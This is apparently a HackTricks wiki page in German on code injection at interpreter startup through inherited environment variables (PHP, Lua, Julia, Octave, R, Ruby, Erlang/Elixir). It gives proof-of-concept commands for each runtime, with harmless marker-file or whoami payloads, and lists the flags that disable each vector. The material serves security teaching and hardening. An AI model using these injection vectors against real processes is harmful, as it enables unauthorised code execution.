# macOS Interpreter-Startup-Injection über Umgebungsvariablen

{{#include ../../../banners/hacktricks-training.md}}

Diese laufzeitspezifischen Techniken verwenden geerbte Umgebungsvariablen, um die Startup-Konfiguration auszuwählen, Code vorzuladen oder VM-Flags bereitzustellen, bevor die vorgesehene Workload gestartet wird. Einige Varianten verwenden Dateien; Lua und Erlang unterstützen außerdem die Ausführung von Inline-Code.

## PHP-Startup-Konfiguration

### `PHPRC` / `PHP_INI_SCAN_DIR` und `auto_prepend_file`

PHP CLI und CGI lesen bei jedem Aufruf die Konfiguration ein. Mit `PHPRC` lässt sich eine für den Angreifer lesbare `php.ini` auswählen, während `PHP_INI_SCAN_DIR` das Verzeichnis ändern kann, in dem nach zusätzlichen `.ini`-Dateien gesucht wird. Die Direktive `auto_prepend_file` bewirkt, dass PHP vor dem angeforderten Skript eine Datei einliest. Diese Kombination ermöglicht daher die Ausführung von Code beim Start.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Eine Alternative ist ein Verzeichnis, das eine `.ini`-Datei enthält:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Die Option `-n` ignoriert `php.ini`; ein expliziter vertrauenswürdiger `-c`-Pfad hat Vorrang vor `PHPRC`. Beachten Sie, dass ein langlebiger Server-SAPI die Konfiguration normalerweise beim Start des Webservers einliest, während CLI und CGI dies bei jedem Aufruf tun.<sup>[[1]](#references)</sup>

## Lua-Startcode

### `LUA_INIT`

Vor der Verarbeitung von Befehlszeilenoptionen oder des Zielskripts führt der eigenständige Lua-Interpreter `LUA_INIT_<major>_<minor>` aus oder, falls die versionsspezifische Variable nicht gesetzt ist, `LUA_INIT`. Ein Wert, der mit `@` beginnt, gibt eine Datei an; jeder andere Wert wird direkt als Lua-Code ausgewertet. Dies ermöglicht sowohl dateibasierte als auch dateilose Startausführung.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Der genaue versionsabhängige Name ändert sich je nach Interpreter, zum Beispiel `LUA_INIT_5_4`. `lua -E` ignoriert alle Umgebungsvariablen, einschließlich des Startup-Codes und der Lua-Modulpfade.

## Julia-Startup-Depot

### `JULIA_DEPOT_PATH` und `startup.jl`

Julia führt beim Start normalerweise `config/startup.jl` aus dem ersten Depot aus. `JULIA_DEPOT_PATH` steuert die Depotliste. Wird der Pfad auf einen für einen Angreifer lesbaren Verzeichnisbaum gesetzt, wird dadurch die automatisch geladene Startup-Datei umgeleitet.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Der abschließende Trenner ist nützlich, wenn das Opfer weiterhin seine normalen Pakete benötigt. `julia --startup-file=no` deaktiviert diese Startup-Datei. Setze die Variable vor dem Start zurück, da sie auch Paketregistries, Umgebungen, Caches und Speicherorte zum Laden von Code steuert.

## GNU Octave-Startup-Dateien

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave führt beim Start mehrere Dateien aus, die gültige Octave-Befehle enthalten. `OCTAVE_SITE_INITFILE` überschreibt die systemweite Startup-Datei und `OCTAVE_VERSION_INITFILE` die versionsspezifische. Dadurch kann jede der beiden Variablen die automatische Ausführung auf eine für den Angreifer lesbare Datei umleiten.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` überspringt nur benutzerspezifische Dateien wie `~/.octaverc`; die oben beschriebene Überschreibung der Site-Datei wird dadurch **nicht** verhindert. Verwenden Sie `--no-site-file` für die Site-Dateien oder `--norc` / `-f`, um alle Startup-Dateien zu deaktivieren.<sup>[[7]](#references)</sup>

## R-Startup-Profile und Laden von Paketen

### `R_PROFILE_USER` / `R_PROFILE`

Beim Start lädt R Site- und Benutzerprofildateien, die R-Code enthalten. `R_PROFILE` legt das Site-Profil fest und `R_PROFILE_USER` das Benutzerprofil. Dadurch kann eine übernommene Umgebung eine der beiden Suchen auf eine für einen Angreifer lesbare Datei umleiten.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` überspringt das Benutzerprofil, `--no-site-file` überspringt das Site-Profil und `--vanilla` umfasst beide Schutzmaßnahmen. R verarbeitet zuerst die durch `R_ENVIRON` und `R_ENVIRON_USER` ausgewählten Umgebungsdateien, aber diese Dateien setzen nur Variablen; die Profilvariablen sind die direkte Primitive für beliebige Codeausführung.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` und Bibliothekspfade

R hängt beim Start die durch Kommas getrennten Pakete aus `R_DEFAULT_PACKAGES` an. `Rscript` gibt `R_SCRIPT_DEFAULT_PACKAGES` Vorrang. In Kombination mit `R_LIBS`, `R_LIBS_USER` oder `R_LIBS_SITE` kann eine dieser Variablen dazu führen, dass R ein vom Angreifer kontrolliertes installiertes Paket findet und lädt; dessen `.onLoad`- oder `.onAttach`-Hook wird automatisch ausgeführt.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Dies erfordert ein strukturell gültiges installiertes R-Paket, nicht lediglich eine lose `.R`-Datei. `--vanilla` entfernt keine direkt geerbten Variablen. Ein vertrauenswürdiger Wrapper muss daher die Variablen für Standardpakete und Bibliothekspfade ebenfalls aufheben oder ersetzen und Profil-Dateien deaktivieren.

## Ruby-Loader-Optionen

### RUBYOPT

Ruby verarbeitet unterstützte Befehlszeilenoptionen aus der Umgebungsvariable `RUBYOPT`, bevor ein Skript ausgeführt wird. Ruby lehnt die Codeausführung über `-e` in `RUBYOPT` ab, aber `-I` kann ein Verzeichnis an den Anfang des Bibliothekssuchpfads setzen und `-r` kann eine Bibliothek laden. Ein Prozess, der Ruby mit angreifergesteuerten Umgebungsvariablen startet, kann daher dazu gebracht werden, angreifergesteuerten Ruby-Code zu laden.<sup>[[10]](#references)</sup>

Erstelle `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Erstellen Sie ein harmloses Ruby-Skript wie `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Führe es mit einem kontrollierten `RUBYOPT`-Wert aus:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Um dieses Verhalten zu deaktivieren, übergib `--disable=rubyopt` (oder `--disable-rubyopt`) **vor** dem Skriptnamen:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Eine Option, die nach `hello.rb` angegeben wird, wird dem Skript in `ARGV` übergeben; sie deaktiviert nicht die vorherige Verarbeitung von `RUBYOPT` durch Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Anstatt das Ladeverzeichnis mit `-I` in `RUBYOPT` voranzustellen, fügt die separate Umgebungsvariable `RUBYLIB` Verzeichnisse zu Rubys `$LOAD_PATH` hinzu. In Kombination mit `RUBYOPT=-r<module>` wird dadurch Code des Angreifers geladen, ohne dass `-I` in `RUBYOPT` benötigt wird:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Erlang- und Elixir-VM-Flags

### `ERL_AFLAGS`, `ERL_FLAGS` und `ERL_ZFLAGS`

Der `erl`-Launcher fügt `ERL_AFLAGS` am Anfang seiner Befehlszeile und `ERL_FLAGS` / `ERL_ZFLAGS` am Ende hinzu. Da `-eval` während der VM-Initialisierung einen Erlang-Ausdruck auswertet, können diese Variablen dateilose Codeausführung ermöglichen, bevor die vorgesehene Arbeitslast gestartet wird.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix und viele Elixir-Releases starten letztlich die Erlang VM und übernehmen möglicherweise diese Flags. Prüfe den genauen Release-Wrapper: Er kann VM-Argumente neu erstellen oder bereinigen, während manche Tools `ERL_AFLAGS`, `ERL_ZFLAGS` oder `ELIXIR_ERL_OPTIONS` ausdrücklich unterstützen.<sup>[[12]](#references)</sup>

Im Gegensatz zu den meisten dateibasierten Techniken benötigt die `-eval`-Payload keine vom Angreifer kontrollierte Datei. Ein vertrauenswürdiger Wrapper sollte alle drei Erlang-Flag-Variablen (und bei Elixir `ELIXIR_ERL_OPTIONS`) vor dem Start der Laufzeitumgebung löschen. Versuche nicht, einzelne VM-Flags per Allowlist zuzulassen, sofern Parser und Reihenfolge nicht vollständig verstanden sind.

## References

- [1] [PHP-Konfigurationsdatei](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Eigenständiger Interpreter von Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia-Kommandozeilenschnittstelle: Startup-Datei](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia-Umgebungsvariablen: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave: Startup-Dateien](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave: Kommandozeilenoptionen](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Initialisierung beim Start einer R-Sitzung](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [R-Installation und -Administration: Zusatzpakete](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Ruby-Dokumentation – Ruby-Kommandozeilenoptionen](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [`erl`-Befehl und Umgebungsvariablen](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Elixir-Releases und VM-Umgebungsoptionen](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
